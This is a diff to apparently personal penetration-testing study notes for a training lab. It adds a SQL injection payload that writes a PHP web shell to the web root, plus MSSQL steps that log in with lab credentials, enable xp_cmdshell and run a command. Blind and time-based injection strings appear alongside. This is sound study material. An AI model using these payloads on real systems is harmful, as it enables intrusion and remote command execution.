@@ -753,7 +753,8 @@ http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
 #time-based SQLi
 http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
 
-
+#
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
 ```
 
 
@@ -768,3 +769,13 @@ SELECT * FROM offsec.information_schema.tables;
 select * from offsec.dbo.users;
 ```
 
+### mssql sqli
+```bash
+#Manual Code Execution
+impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXECUTE xp_cmdshell 'whoami';
+```
